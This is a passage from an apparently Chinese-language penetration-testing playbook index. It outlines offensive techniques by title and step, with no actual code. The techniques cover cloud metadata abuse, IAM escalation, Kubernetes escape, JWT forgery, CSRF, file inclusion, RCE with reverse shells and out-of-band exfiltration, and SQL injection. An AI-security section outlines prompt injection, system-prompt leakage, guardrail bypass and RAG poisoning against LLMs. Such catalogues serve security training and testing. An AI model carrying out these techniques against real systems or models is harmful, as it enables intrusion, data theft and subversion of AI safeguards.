1. 1. AWS元数据服务探测
2. 2. GCP/Azure元数据利用
3. 3. 利用获取的凭据横向移动
4. 4. 深度利用——S3数据泄露/权限提升
## S3存储桶配置错误利用
- ID: cloud-s3-misconfig
- Difficulty: beginner
- Subcategory: S3安全
- Tags: 云安全, S3, AWS, 配置错误, 数据泄露
- Original Extracted Source: original extracted web-security-wiki source/cloud-s3-misconfig.md
Description:
利用AWS S3存储桶的访问控制配置错误(公开读/写/列举)获取敏感数据或植入恶意文件。常见于静态网站托管、日志存储和备份桶，可能导致数据泄露、网站篡改或供应链攻击。
Prerequisites:
- 已知目标S3桶名
- AWS CLI或HTTP访问
Execution Outline:
1. 1. S3桶名枚举
2. 2. 权限枚举
3. 3. 敏感数据搜索
4. 4. 验证利用（静态网站篡改/XSS）
## AWS IAM权限提升
- ID: cloud-iam-escalation
- Difficulty: advanced
- Subcategory: IAM提权
- Tags: 云安全, AWS, IAM, 权限提升, Privilege Escalation
- Original Extracted Source: original extracted web-security-wiki source/cloud-iam-escalation.md
Description:
在已获取低权限AWS凭据后，利用IAM策略中的过度授权(如iam:PassRole、lambda:CreateFunction等)实现权限提升至管理员。涵盖20+种已知的AWS IAM提权路径。
Prerequisites:
- 已获取AWS凭据
- IAM策略存在过度授权
Execution Outline:
1. 1. 枚举当前权限
2. 2. iam:PassRole + Lambda提权
3. 3. 其他提权路径
4. 4. 自动化提权工具
## Kubernetes容器逃逸
- ID: cloud-k8s-escape
- Difficulty: expert
- Subcategory: 容器安全
- Tags: 云安全, Kubernetes, 容器逃逸, Docker, 特权容器
- Original Extracted Source: original extracted web-security-wiki source/cloud-k8s-escape.md
Description:
在已获取Kubernetes Pod Shell的前提下，利用配置错误(特权容器、挂载宿主机路径、ServiceAccount高权限)实现容器逃逸，进而控制宿主机或整个Kubernetes集群。
Prerequisites:
- 已获取Pod内Shell
- Pod存在配置错误
Execution Outline:
1. 1. 容器环境侦察
2. 2. 特权容器逃逸
3. 3. 利用ServiceAccount接管集群
4. 4. 创建特权Pod反弹Shell

---

## Source: 12-ai-security.md

Path: references\web-playbook-12-ai-security.md

# AI安全
English: AI Security
- Entry Count: 4
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## LLM提示注入攻击
- ID: ai-prompt-injection
- Difficulty: beginner
- Subcategory: 提示注入
- Tags: AI, LLM, Prompt Injection, ChatGPT, 提示注入
- Original Extracted Source: original extracted web-security-wiki source/ai-prompt-injection.md
Description:
通过精心构造的用户输入覆盖或绕过LLM(大语言模型)的系统提示(System Prompt)，使AI执行非预期的操作。包括直接注入(DPI)和间接注入(IPI)，可导致系统提示泄露、安全护栏绕过、数据泄露和未授权操作。
Prerequisites:
- 目标应用集成了LLM
- 可与LLM交互输入文本
Execution Outline:
1. 1. 系统提示泄露
2. 2. 安全护栏绕过
3. 3. 间接提示注入(IPI)
4. 4. 利用AI工具调用(Function Calling)
## AI模型窃取与推理攻击
- ID: ai-model-extraction
- Difficulty: advanced
- Subcategory: 模型攻击
- Tags: AI, 模型窃取, Model Extraction, 成员推断, API滥用
- Original Extracted Source: original extracted web-security-wiki source/ai-model-extraction.md
Description:
通过大量精心构造的查询对AI模型进行黑盒攻击，窃取模型参数(Model Extraction)、推断训练数据(Membership Inference)或发现模型决策边界。攻击者可以此构建功能等价的替代模型或提取隐私数据。
Prerequisites:
- 目标提供AI推理API
- API返回概率/置信度分数
Execution Outline:
1. 1. API探测与能力分析
2. 2. 模型窃取(Model Extraction)
3. 3. 成员推断攻击(MIA)
4. 4. 训练数据提取
## 对抗样本攻击
- ID: ai-adversarial
- Difficulty: expert
- Subcategory: 对抗攻击
- Tags: AI, 对抗样本, Adversarial, FGSM, Evasion
- Original Extracted Source: original extracted web-security-wiki source/ai-adversarial.md
Description:
通过向输入数据中添加人类不可感知的微小扰动，使AI模型产生错误的预测结果。对抗样本攻击可应用于图像分类、文本分析、语音识别等多种AI模型，威胁自动驾驶、安全检测和内容审核系统。
Prerequisites:
- 目标使用AI进行自动化决策
- 可控制输入数据
Execution Outline:
1. 1. 白盒攻击——FGSM
2. 2. 黑盒攻击——基于查询
3. 3. 文本对抗攻击
4. 4. 物理世界对抗攻击
## RAG投毒与知识库注入
- ID: ai-rag-poisoning
- Difficulty: intermediate
- Subcategory: RAG攻击
- Tags: AI, RAG, 知识库, 向量数据库, 数据投毒
- Original Extracted Source: original extracted web-security-wiki source/ai-rag-poisoning.md
Description:
针对使用RAG(Retrieval-Augmented Generation)架构的AI应用，通过投毒知识库中的文档来影响AI的回答。攻击者可在向量数据库中注入包含恶意指令的文档，当用户查询触发检索时，恶意文档被注入到AI上下文中执行间接提示注入。
Prerequisites:
- 目标使用RAG架构
- 可向知识库提交文档
- 了解RAG检索机制
Execution Outline:
1. 1. RAG架构识别与分析
2. 2. 知识库投毒——注入恶意文档
3. 3. 触发投毒文档检索
4. 4. 向量数据库直接攻击

---

## Source: 13-api-security.md

Path: references\web-playbook-13-api-security.md

# API安全
English: API Security
- Entry Count: 12
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## JWT安全漏洞
- ID: jwt-security
- Difficulty: intermediate
- Subcategory: JWT
- Tags: jwt, token, authentication
- Original Extracted Source: original extracted web-security-wiki source/jwt-security.md
Description:
JSON Web Token安全漏洞利用
Prerequisites:
- 使用JWT进行认证
- JWT配置或验证存在问题
Execution Outline:
1. 1. 解码JWT
2. 2. None算法攻击
3. 3. 弱密钥破解
4. 4. 密钥混淆攻击
## GraphQL注入攻击
- ID: graphql-injection
- Difficulty: intermediate
- Subcategory: GraphQL
- Tags: graphql, api, injection, introspection
- Original Extracted Source: original extracted web-security-wiki source/graphql-injection.md
Description:
GraphQL API注入与信息泄露攻击
Prerequisites:
- 目标使用GraphQL API
- 存在未授权访问或注入点
Execution Outline:
1. 1. 探测GraphQL端点
2. 2. 内省查询
3. 3. 批量查询攻击
4. 4. SQL注入
## GraphQL内省攻击
- ID: graphql-introspection
- Difficulty: beginner
- Subcategory: GraphQL内省
- Tags: graphql, introspection, enumeration, api
- Original Extracted Source: original extracted web-security-wiki source/graphql-introspection.md
Description:
利用GraphQL内省功能获取API结构
Prerequisites:
- 目标使用GraphQL
- 内省功能未禁用
Execution Outline:
1. 1. 基础内省
2. 2. 完整内省
3. 3. 使用工具分析
## GraphQL批量查询攻击
- ID: graphql-batching
- Difficulty: intermediate
- Subcategory: GraphQL批量查询
- Tags: graphql, batching, rate-limit, bypass
- Original Extracted Source: original extracted web-security-wiki source/graphql-batching.md
Description:
利用GraphQL批量查询绕过速率限制
Prerequisites:
- 目标使用GraphQL
- 存在速率限制
Execution Outline:
1. 1. 别名批量查询
2. 2. 数组批量查询
3. 3. 暴力破解
## REST API安全测试
- ID: rest-api-security
- Difficulty: intermediate
- Subcategory: REST API
- Tags: rest, api, security, testing
- Original Extracted Source: original extracted web-security-wiki source/rest-api-security.md
Description:
REST API安全测试与漏洞利用
Prerequisites:
- 目标使用REST API
- 了解API端点
Execution Outline:
1. 1. API端点发现
2. 2. 认证测试
3. 3. HTTP方法测试
4. 4. 参数污染
## JWT None算法攻击
- ID: jwt-none-alg
- Difficulty: beginner
- Subcategory: JWT安全
- Tags: jwt, none, algorithm, bypass
- Original Extracted Source: original extracted web-security-wiki source/jwt-none-alg.md
Description:
利用JWT None算法绕过签名验证
Prerequisites:
- 目标使用JWT认证
- 服务器未正确验证算法
Execution Outline:
1. 1. 解码JWT
2. 2. 构造None算法Token
3. 3. 修改用户权限
4. 4. 发送恶意Token
## JWT密钥混淆攻击
- ID: jwt-key-confusion
- Difficulty: intermediate
- Subcategory: JWT安全
- Tags: jwt, algorithm, confusion, rs256
- Original Extracted Source: original extracted web-security-wiki source/jwt-key-confusion.md
Description:
利用JWT算法混淆实现签名绕过
Prerequisites:
- 目标使用RS256算法
- 可获取公钥
Execution Outline:
1. 1. 获取公钥
2. 2. 算法混淆攻击
3. 3. 发送恶意Token
## IDOR不安全的直接对象引用
- ID: api-idor
- Difficulty: beginner
- Subcategory: IDOR
- Tags: idor, api, authorization, bypass
- Original Extracted Source: original extracted web-security-wiki source/api-idor.md
Description:
利用IDOR漏洞访问未授权资源
Prerequisites:
- 目标使用ID引用资源
- 存在授权检查缺陷
Execution Outline:
1. 1. 识别ID参数
2. 2. 枚举ID
3. 3. 批量检测
4. 4. 跨用户访问
## API速率限制绕过
- ID: api-rate-limit
- Difficulty: intermediate
- Subcategory: 速率限制
- Tags: api, rate-limit, bypass, brute-force
- Original Extracted Source: original extracted web-security-wiki source/api-rate-limit.md
Description:
绕过API速率限制进行暴力攻击
Prerequisites:
- 目标有速率限制
- 限制实现有缺陷
Execution Outline:
1. 1. 检测速率限制
2. 2. IP绕过
3. 3. 分布式绕过
4. 4. 其他绕过技术
## 批量赋值漏洞
- ID: api-mass-assignment
- Difficulty: beginner
- Subcategory: 批量赋值
- Tags: api, mass-assignment, privilege-escalation
- Original Extracted Source: original extracted web-security-wiki source/api-mass-assignment.md
Description:
利用批量赋值漏洞修改敏感字段
Prerequisites:
- API接受JSON输入
- 存在未过滤的字段
Execution Outline:
1. 1. 识别输入字段
2. 2. 添加敏感字段
3. 3. 更新操作
4. 4. 嵌套对象
## BOLA破坏对象级授权
- ID: api-bola
- Difficulty: intermediate
- Subcategory: BOLA
- Tags: api, bola, authorization, idor
- Original Extracted Source: original extracted web-security-wiki source/api-bola.md
Description:
利用BOLA漏洞访问未授权对象
Prerequisites:
- API使用对象ID
- 授权检查缺陷
Execution Outline:
1. 1. 识别对象访问
2. 2. 测试授权
3. 3. 横向访问
4. 4. 修改/删除操作
## API注入攻击
- ID: api-injection
- Difficulty: intermediate
- Subcategory: API注入
- Tags: api, injection, sqli, nosqli
- Original Extracted Source: original extracted web-security-wiki source/api-injection.md
Description:
API端点中的各类注入攻击
Prerequisites:
- API接受用户输入
- 输入未正确过滤
Execution Outline:
1. 1. SQL注入
2. 2. NoSQL注入
3. 3. LDAP注入
4. 4. 命令注入

---

## Source: 14-csrf-cross-site-request-forgery.md

Path: references\web-playbook-14-csrf-cross-site-request-forgery.md

# CSRF跨站请求伪造
English: CSRF Cross-Site Request Forgery
- Entry Count: 8
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## CSRF基础攻击
- ID: csrf-basic
- Difficulty: beginner
- Subcategory: 基础攻击
- Tags: csrf, cross-site, request, forgery
- Original Extracted Source: original extracted web-security-wiki source/csrf-basic.md
Description:
跨站请求伪造基础攻击技术
Prerequisites:
- 目标存在敏感操作
- 缺少CSRF保护
Execution Outline:
1. 1. 构造CSRF表单
2. 2. GET请求CSRF
3. 3. JSON CSRF
4. 4. 链接诱导
## JSON CSRF攻击
- ID: csrf-json
- Difficulty: intermediate
- Subcategory: JSON CSRF
- Tags: csrf, json, api, post
- Original Extracted Source: original extracted web-security-wiki source/csrf-json.md
Description:
针对JSON请求的CSRF攻击技术
Prerequisites:
- 目标使用JSON格式请求
- 缺少CSRF保护
- CORS配置不当
Execution Outline:
1. 1. 简单JSON CSRF
2. 2. Flash JSON CSRF
3. 3. XSSI攻击
4. 4. SWF文件攻击
## CSRF绕过技术
- ID: csrf-bypass
- Difficulty: intermediate
- Subcategory: 绕过技术
- Tags: csrf, bypass, token, referer
- Original Extracted Source: original extracted web-security-wiki source/csrf-bypass.md
Description:
绕过CSRF防护的各种技术
Prerequisites:
- 目标存在CSRF防护
- 防护机制存在缺陷
Execution Outline:
1. 1. Token验证绕过
2. 2. Referer验证绕过
3. 3. Origin验证绕过
4. 4. SameSite绕过
## SameSite绕过技术
- ID: csrf-samesite
- Difficulty: intermediate
- Subcategory: SameSite绕过
- Tags: csrf, samesite, cookie, bypass
- Original Extracted Source: original extracted web-security-wiki source/csrf-samesite.md
Description:
绕过SameSite Cookie属性的CSRF攻击
Prerequisites:
- Cookie设置了SameSite属性
- SameSite配置存在缺陷
Execution Outline:
1. 1. SameSite=Lax绕过
2. 2. SameSite=Strict绕过
3. 3. 未设置SameSite
4. 4. 利用OAuth流程
## Token绕过技术
- ID: csrf-token-bypass
- Difficulty: intermediate
- Subcategory: Token绕过
- Tags: csrf, token, bypass, predictable
- Original Extracted Source: original extracted web-security-wiki source/csrf-token-bypass.md
Description:
绕过CSRF Token验证的技术
Prerequisites:
- 目标使用CSRF Token
- Token机制存在缺陷
Execution Outline:
1. 1. Token可预测
2. 2. Token未绑定会话
3. 3. Token泄露
4. 4. Token重放
## Referer绕过技术
- ID: csrf-referer-bypass
- Difficulty: intermediate
- Subcategory: Referer绕过
- Tags: csrf, referer, bypass, header
- Original Extracted Source: original extracted web-security-wiki source/csrf-referer-bypass.md
Description:
绕过Referer验证的CSRF攻击
Prerequisites:
- 目标验证Referer头
- 验证逻辑存在缺陷
Execution Outline:
1. 1. 正则匹配绕过
2. 2. 空Referer绕过
3. 3. 子域名绕过
4. 4. Referrer-Policy利用
## Flash CSRF攻击
- ID: csrf-flash
- Difficulty: advanced
- Subcategory: Flash CSRF
- Tags: csrf, flash, swf, crossdomain
- Original Extracted Source: original extracted web-security-wiki source/csrf-flash.md
Description:
利用Flash进行CSRF攻击
Prerequisites:
- 目标允许Flash请求
- crossdomain.xml配置不当
Execution Outline:
1. 1. crossdomain.xml利用
2. 2. 创建恶意SWF
3. 3. 发送JSON请求
4. 4. 自定义Header
## CORS配置错误利用
- ID: csrf-cors
- Difficulty: intermediate
- Subcategory: CORS配置错误
- Tags: csrf, cors, misconfiguration, api
- Original Extracted Source: original extracted web-security-wiki source/csrf-cors.md
Description:
利用CORS配置错误进行CSRF攻击
Prerequisites:
- CORS配置错误
- 允许跨域携带凭证
Execution Outline:
1. 1. 检测CORS配置
2. 2. 反射Origin攻击
3. 3. null源攻击
4. 4. 正则绕过

---

## Source: 15-jwt-security.md

Path: references\web-playbook-15-jwt-security.md

# JWT安全
English: JWT Security
- Entry Count: 4
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## JWT None算法攻击
- ID: jwt-none-attack
- Difficulty: beginner
- Subcategory: 算法攻击
- Tags: JWT, none算法, 认证绕过, 令牌伪造, CVE-2015-2951
- Original Extracted Source: original extracted web-security-wiki source/jwt-none-attack.md
Description:
利用JWT库对"none"算法的支持缺陷，将JWT头部的签名算法修改为none后移除签名部分，构造无需密钥即可通过验证的伪造令牌。这是最经典的JWT漏洞之一。
Prerequisites:
- 目标使用JWT进行身份认证
- jwt_tool或Python PyJWT库
Execution Outline:
1. 1. 解码现有JWT
2. 2. 构造None算法JWT
3. 3. jwt_tool自动攻击
4. 4. 验证伪造令牌
## JWT密钥混淆攻击(RS→HS)
- ID: jwt-key-confusion
- Difficulty: advanced
- Subcategory: 算法攻击
- Tags: JWT, 密钥混淆, RS256, HS256, 算法篡改
- Original Extracted Source: original extracted web-security-wiki source/jwt-key-confusion.md
Description:
当服务端使用RSA公钥验证JWT时，攻击者将算法从RS256改为HS256，此时服务端会错误地使用RSA公钥作为HMAC密钥进行验证。由于RSA公钥是公开的，攻击者可用它签名任意JWT。
Prerequisites:
- 目标JWT使用RS256/RS384/RS512算法
- 已获取RSA公钥
- jwt_tool或Python
Execution Outline:
1. 1. 获取RSA公钥
2. 2. 密钥混淆攻击
3. 3. jwt_tool自动攻击
4. 4. JWKS端点注入
## JWT密钥爆破
- ID: jwt-secret-bruteforce
- Difficulty: intermediate
- Subcategory: 密钥破解
- Tags: JWT, 密钥爆破, HS256, 弱密钥, hashcat
- Original Extracted Source: original extracted web-security-wiki source/jwt-secret-bruteforce.md
Description:
当JWT使用HMAC对称算法(HS256/HS384/HS512)且密钥为弱密码时，可通过字典或暴力破解还原签名密钥，进而伪造任意JWT令牌。
Prerequisites:
- 目标JWT使用HMAC算法(HS256等)
- 已获取有效JWT样本
- hashcat或jwt_tool
Execution Outline:
1. 1. 确认算法和结构
2. 2. hashcat GPU加速爆破
3. 3. jwt_tool字典爆破
4. 4. 使用破解密钥伪造JWT
## JWT JKU/X5U头注入
- ID: jwt-jku-x5u-injection
- Difficulty: advanced
- Subcategory: Header注入
- Tags: JWT, JKU, X5U, Header注入, JWKS, 密钥劫持
- Original Extracted Source: original extracted web-security-wiki source/jwt-jku-x5u-injection.md
Description:
利用JWT Header中的jku(JWK Set URL)或x5u(X.509 URL)参数，将密钥来源指向攻击者控制的服务器，使服务端使用攻击者的公钥验证JWT，从而实现令牌伪造。
Prerequisites:
- 目标JWT支持jku/x5u Header参数
- 攻击者拥有公网服务器
- Python环境
Execution Outline:
1. 1. 探测JKU/X5U支持
2. 2. 生成攻击者密钥对
3. 3. 托管JWKS并签名JWT
4. 4. 验证攻击

---

## Source: 16-lfi-rfi-file-inclusion.md

Path: references\web-playbook-16-lfi-rfi-file-inclusion.md

# LFI/RFI文件包含
English: LFI/RFI File Inclusion
- Entry Count: 12
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## 本地文件包含
- ID: lfi-basic
- Difficulty: intermediate
- Subcategory: 本地包含
- Tags: lfi, local, file, inclusion
- Original Extracted Source: original extracted web-security-wiki source/lfi-basic.md
Description:
本地文件包含漏洞利用技术
Prerequisites:
- 存在文件包含功能
- 用户可控制包含路径
Execution Outline:
1. 1. 探测LFI
2. 2. 读取敏感文件
3. 3. PHP伪协议
4. 4. 日志投毒
## 远程文件包含
- ID: rfi-basic
- Difficulty: intermediate
- Subcategory: 远程包含
- Tags: rfi, remote, file, inclusion
- Original Extracted Source: original extracted web-security-wiki source/rfi-basic.md
Description:
远程文件包含漏洞利用技术
Prerequisites:
- 存在文件包含功能
- allow_url_include=On
- 用户可控制包含路径
Execution Outline:
1. 1. 探测RFI
2. 2. 托管恶意文件
3. 3. 反弹Shell
4. 4. 使用data协议
## 日志投毒LFI
- ID: lfi-log-poison
- Difficulty: intermediate
- Subcategory: 日志投毒
- Tags: lfi, log, poison, rce
- Original Extracted Source: original extracted web-security-wiki source/lfi-log-poison.md
Description:
通过日志投毒实现LFI到RCE
Prerequisites:
- 存在LFI漏洞
- 可包含日志文件
- 日志文件可写
Execution Outline:
1. 1. 探测日志文件位置
2. 2. 投毒User-Agent
3. 3. 投毒请求路径
4. 4. 执行命令
## PHP伪协议利用
- ID: lfi-wrapper
- Difficulty: intermediate
- Subcategory: 伪协议
- Tags: lfi, wrapper, php, protocol
- Original Extracted Source: original extracted web-security-wiki source/lfi-wrapper.md
Description:
利用PHP伪协议进行LFI攻击
Prerequisites:
- 存在LFI漏洞
- PHP环境
- 伪协议未禁用
Execution Outline:
1. 1. php://filter
2. 2. php://input
3. 3. data://协议
4. 4. phar://协议
## 目录遍历技术
- ID: lfi-traversal
- Difficulty: beginner
- Subcategory: 目录遍历
- Tags: lfi, traversal, bypass, path
- Original Extracted Source: original extracted web-security-wiki source/lfi-traversal.md
Description:
LFI目录遍历绕过技术
Prerequisites:
- 存在LFI漏洞
- 存在路径过滤
Execution Outline:
1. 1. 基础遍历
2. 2. 绕过删除../
3. 3. URL编码绕过
4. 4. Unicode编码绕过
## PHP Filter链攻击
- ID: lfi-php-filter
- Difficulty: intermediate
- Subcategory: PHP Filter
- Tags: lfi, php, filter, chain
- Original Extracted Source: original extracted web-security-wiki source/lfi-php-filter.md
Description:
利用PHP Filter链进行LFI攻击
Prerequisites:
- 存在LFI漏洞
- PHP环境
- filter伪协议可用
Execution Outline:
1. 1. 读取源码
2. 2. 多重过滤器
3. 3. Filter链RCE
4. 4. 读取配置文件
## PHP Input执行
- ID: lfi-php-input
- Difficulty: intermediate
- Subcategory: PHP Input
- Tags: lfi, php, input, rce
- Original Extracted Source: original extracted web-security-wiki source/lfi-php-input.md
Description:
利用php://input执行PHP代码
Prerequisites:
- 存在LFI漏洞
- allow_url_include=On
- POST方法可用
Execution Outline:
1. 1. 基础执行
2. 2. 命令执行
3. 3. 文件操作
4. 4. 反弹Shell
## PHP Data协议攻击
- ID: lfi-php-data
- Difficulty: intermediate
- Subcategory: PHP Data
- Tags: lfi, php, data, protocol
- Original Extracted Source: original extracted web-security-wiki source/lfi-php-data.md
Description:
利用data://协议执行PHP代码
Prerequisites:
- 存在LFI漏洞
- allow_url_include=On
- data协议可用
Execution Outline:
1. 1. 基础执行
2. 2. Base64编码
3. 3. 命令执行
4. 4. 反弹Shell
## PHP Zip协议攻击
- ID: lfi-php-zip
- Difficulty: intermediate
- Subcategory: PHP Zip
- Tags: lfi, php, zip, archive
- Original Extracted Source: original extracted web-security-wiki source/lfi-php-zip.md
Description:
利用zip://协议进行LFI攻击
Prerequisites:
- 存在LFI漏洞
- 可上传zip文件
- zip协议可用
Execution Outline:
1. 1. 创建恶意Zip
2. 2. 上传Zip文件
3. 3. 包含Zip文件
4. 4. 图片马
## Phar反序列化攻击
- ID: lfi-phar
- Difficulty: advanced
- Subcategory: Phar反序列化
- Tags: lfi, phar, deserialization, rce
- Original Extracted Source: original extracted web-security-wiki source/lfi-phar.md
Description:
利用Phar反序列化进行RCE
Prerequisites:
- 存在LFI漏洞
- PHP环境
- phar扩展可用
Execution Outline:
1. 1. 创建Phar文件
2. 2. 触发反序列化
3. 3. 图片马Phar
4. 4. 常见Gadget链
## Session文件包含
- ID: lfi-session
- Difficulty: intermediate
- Subcategory: Session包含
- Tags: lfi, session, file, inclusion
- Original Extracted Source: original extracted web-security-wiki source/lfi-session.md
Description:
利用Session文件进行LFI攻击
Prerequisites:
- 存在LFI漏洞
- 可控制Session内容
- 知道Session路径
Execution Outline:
1. 1. 探测Session路径
2. 2. 控制Session内容
3. 3. 包含Session文件
4. 4. Session竞争条件
## Proc文件系统利用
- ID: lfi-proc
- Difficulty: intermediate
- Subcategory: Proc文件系统
- Tags: lfi, proc, linux, environ
- Original Extracted Source: original extracted web-security-wiki source/lfi-proc.md
Description:
利用/proc文件系统进行LFI攻击
Prerequisites:
- 存在LFI漏洞
- Linux系统
- /proc可访问
Execution Outline:
1. 1. 读取进程信息
2. 2. 读取环境变量
3. 3. 通过fd读取日志
4. 4. 读取其他进程

---

## Source: 17-rce-remote-code-execution.md

Path: references\web-playbook-17-rce-remote-code-execution.md

# RCE远程代码执行
English: RCE Remote Code Execution
- Entry Count: 12
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## 命令注入
- ID: rce-command-injection
- Difficulty: intermediate
- Subcategory: 命令注入
- Tags: rce, command, injection, os
- Original Extracted Source: original extracted web-security-wiki source/rce-command-injection.md
Description:
操作系统命令注入攻击技术
Prerequisites:
- 存在系统命令执行功能
- 用户输入未过滤
Execution Outline:
1. 1. 探测命令注入
2. 2. Linux命令注入
3. 3. Windows命令注入
4. 4. 盲命令注入
## PHP代码执行
- ID: rce-php
- Difficulty: intermediate
- Subcategory: PHP代码执行
- Tags: rce, php, code, execution
- Original Extracted Source: original extracted web-security-wiki source/rce-php.md
Description:
PHP代码执行漏洞利用技术
Prerequisites:
- 存在PHP代码执行点
- 用户输入可控制代码
Execution Outline:
1. 1. 常见危险函数
2. 2. 命令执行
3. 3. 一句话木马
4. 4. 免杀一句话
## PHP Filter链RCE
- ID: rce-php-filter
- Difficulty: advanced
- Subcategory: PHP Filter链
- Tags: rce, php, filter, chain
- Original Extracted Source: original extracted web-security-wiki source/rce-php-filter.md
Description:
利用PHP Filter链构造RCE
Prerequisites:
- 存在文件包含漏洞
- PHP版本支持Filter链
Execution Outline:
1. 1. Filter链原理
2. 2. 构造Filter链
3. 3. 使用工具生成
4. 4. 完整利用示例
## 盲命令注入
- ID: rce-cmd-blind
- Difficulty: intermediate
- Subcategory: 盲命令注入
- Tags: rce, blind, command, injection
- Original Extracted Source: original extracted web-security-wiki source/rce-cmd-blind.md
Description:
无回显的命令注入利用技术
Prerequisites:
- 存在命令注入点
- 无直接回显
Execution Outline:
1. 1. 时间盲注
2. 2. DNS外带
3. 3. HTTP外带
4. 4. ICMP外带
## 反序列化漏洞
- ID: rce-deserialize
- Difficulty: advanced
- Subcategory: 反序列化
- Tags: rce, deserialize, java, php
- Original Extracted Source: original extracted web-security-wiki source/rce-deserialize.md
Description:
利用反序列化漏洞实现RCE
Prerequisites:
- 存在反序列化点
- 存在可利用的Gadget链
Execution Outline:
1. 1. Java反序列化
2. 2. PHP反序列化
3. 3. Python反序列化
4. 4. .NET反序列化
## PHP反序列化
- ID: rce-deserialize-php
- Difficulty: advanced
- Subcategory: PHP反序列化
- Tags: rce, php, deserialize, unserialize
- Original Extracted Source: original extracted web-security-wiki source/rce-deserialize-php.md
Description:
PHP反序列化漏洞利用技术
Prerequisites:
- 存在unserialize调用
- 存在可利用的类
Execution Outline:
1. 1. 魔术方法
2. 2. 构造POP链
3. 3. Phar反序列化
4. 4. Session反序列化
## Java反序列化
- ID: rce-deserialize-java
- Difficulty: advanced
- Subcategory: Java反序列化
- Tags: rce, java, deserialize, ysoserial
- Original Extracted Source: original extracted web-security-wiki source/rce-deserialize-java.md
Description:
Java反序列化漏洞利用技术
Prerequisites:
- 存在Java反序列化点
- 存在Gadget链
Execution Outline:
1. 1. 常见Gadget链
2. 2. 使用ysoserial
3. 3. JRMP攻击
4. 4. 内存马注入
## 文件上传漏洞
- ID: rce-file-upload
- Difficulty: intermediate
- Subcategory: 文件上传
- Tags: rce, upload, webshell, file
- Original Extracted Source: original extracted web-security-wiki source/rce-file-upload.md
Description:
利用文件上传漏洞获取RCE
Prerequisites:
- 存在文件上传功能
- 可上传可执行文件
Execution Outline:
1. 1. 基础上传
2. 2. 前端绕过
3. 3. 后端绕过
4. 4. 图片马
## 文件包含RCE
- ID: rce-include
- Difficulty: intermediate
- Subcategory: 文件包含
- Tags: rce, include, lfi, rfi
- Original Extracted Source: original extracted web-security-wiki source/rce-include.md
Description:
利用文件包含漏洞实现RCE
Prerequisites:
- 存在文件包含漏洞
- 可包含恶意文件
Execution Outline:
1. 1. 日志投毒
2. 2. Session文件包含
3. 3. /proc/self/environ
4. 4. PHP伪协议
## 日志投毒RCE
- ID: rce-log-poison
- Difficulty: intermediate
- Subcategory: 日志投毒
- Tags: rce, log, poison, lfi
- Original Extracted Source: original extracted web-security-wiki source/rce-log-poison.md
Description:
利用日志投毒实现RCE
Prerequisites:
- 存在文件包含漏洞
- 可读取日志文件
Execution Outline:
1. 1. Apache日志投毒
2. 2. Nginx日志投毒
## 图片马RCE
- ID: rce-image
- Difficulty: intermediate
- Subcategory: 图片马
- Tags: rce, image, webshell, upload
- Original Extracted Source: original extracted web-security-wiki source/rce-image.md
Description:
利用图片马实现RCE
Prerequisites:
- 存在文件上传
- 存在文件包含
Execution Outline:
1. 1. 制作图片马
2. 2. 图片马内容
3. 3. 利用文件包含执行
4. 4. 配合.htaccess
## .htaccess利用
- ID: rce-htaccess
- Difficulty: intermediate
- Subcategory: .htaccess
- Tags: rce, htaccess, apache, upload
- Original Extracted Source: original extracted web-security-wiki source/rce-htaccess.md
Description:
利用.htaccess文件实现RCE
Prerequisites:
- Apache服务器
- 可上传.htaccess
Execution Outline:
1. 1. 解析其他扩展名
2. 2. 自动包含
3. 3. 伪静态RCE
4. 4. 错误页面包含

---

## Source: 18-sql-nosql-injection.md

Path: references\web-playbook-18-sql-nosql-injection.md

# SQL/NoSQL注入
English: SQL/NoSQL Injection
- Entry Count: 17
- Use this file to shortlist relevant payloads, then open the linked source markdown for the full workflow and commands.
## MySQL注入 - 基础探测
- ID: sqli-mysql-basic
- Difficulty: beginner
- Subcategory: MySQL
- Tags: sqli, mysql, injection, database
- Original Extracted Source: original extracted web-security-wiki source/sqli-mysql-basic.md
Description:
MySQL数据库注入基础探测与数据提取技术
Prerequisites:
- 目标存在SQL注入点
- 后端数据库为MySQL
- 了解基本SQL语法
Execution Outline:
1. 1. 探测注入点
2. 2. 确定列数
3. 3. 确定显示位置
4. 4. 获取数据库信息
## MySQL注入 - 高级技术
- ID: sqli-mysql-advanced
- Difficulty: advanced
- Subcategory: MySQL
- Tags: sqli, mysql, advanced, file-read, rce
- Original Extracted Source: original extracted web-security-wiki source/sqli-mysql-advanced.md
Description:
MySQL高级注入技术：文件读写、UDF提权、命令执行
Prerequisites:
- MySQL用户具有FILE权限
- 知道网站绝对路径
- secure_file_priv配置允许
Execution Outline:
1. 1. 检测FILE权限
2. 2. 获取网站路径
3. 3. 读取敏感文件
4. 4. 写入WebShell
## MSSQL注入 - 基础探测
- ID: sqli-mssql-basic
- Difficulty: intermediate
- Subcategory: MSSQL
- Tags: sqli, mssql, sqlserver, injection
- Original Extracted Source: original extracted web-security-wiki source/sqli-mssql-basic.md
Description:
Microsoft SQL Server数据库注入技术
Prerequisites:
- 目标存在SQL注入点
- 后端使用MSSQL数据库
Execution Outline:
1. 1. 探测注入点
2. 2. 获取版本信息
3. 3. 获取用户信息
4. 4. 获取数据库信息
## MSSQL注入 - 高级技术
- ID: sqli-mssql-advanced
- Difficulty: advanced
- Subcategory: MSSQL
- Tags: sqli, mssql, xp_cmdshell, rce
- Original Extracted Source: original extracted web-security-wiki source/sqli-mssql-advanced.md
Description:
MSSQL高级注入：xp_cmdshell、SP_OACREATE命令执行
Prerequisites:
- MSSQL具有高权限
- xp_cmdshell可用或可开启
Execution Outline:
1. 1. 检测xp_cmdshell状态
2. 2. 开启xp_cmdshell
3. 3. 执行系统命令
4. 4. 写入WebShell
## Oracle注入 - 基础探测
- ID: sqli-oracle-basic
- Difficulty: intermediate
- Subcategory: Oracle
- Tags: sqli, oracle, injection
- Original Extracted Source: original extracted web-security-wiki source/sqli-oracle-basic.md
Description:
Oracle数据库注入基础技术
Prerequisites:
- 目标存在SQL注入点
- 后端使用Oracle数据库
Execution Outline:
1. 1. 探测注入点
2. 2. 获取版本信息
3. 3. 获取用户信息
4. 4. 获取表名
## Oracle注入 - 高级技术
- ID: sqli-oracle-advanced
- Difficulty: advanced
- Subcategory: Oracle
